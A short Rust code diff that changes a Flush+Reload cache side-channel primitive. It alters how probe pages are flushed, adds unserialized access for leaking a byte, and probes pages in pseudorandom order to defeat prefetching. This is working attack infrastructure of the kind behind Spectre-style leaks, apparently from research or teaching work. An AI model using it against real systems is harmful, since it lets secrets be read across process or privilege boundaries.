@@ -20,7 +20,7 @@ impl FlushReload {
     }
 
     pub fn reset(&self) {
-        for idx in (0..BUFFER_SIZE).step_by(PAGE_SIZE) {
+        for idx in (0..BYTE_SIZE).map(|idx| idx * PAGE_SIZE) {
             unsafe {
                 utils::flush(self.buffer.as_ptr().add(idx));
             }
@@ -29,12 +29,13 @@ impl FlushReload {
 
     pub fn leak_without_prev_reset(&self, x: u8) {
         let access_ptr = unsafe { self.buffer.as_ptr().add(x as usize * PAGE_SIZE) };
-        utils::access(access_ptr);
+        utils::access_unserialized(access_ptr);
     }
 
     pub fn get(&self) -> Option<u8> {
-        let access_times = (0..BUFFER_SIZE)
-            .step_by(PAGE_SIZE)
+        let access_times = (0..BYTE_SIZE)
+            .map(|idx| (113 * idx + 1) % 256) // iterate pseudorandomly
+            .map(|idx| idx * PAGE_SIZE)
             .map(|idx| {
                 let access_ptr = unsafe { self.buffer.as_ptr().add(idx) };
                 utils::measure_access_time(access_ptr)
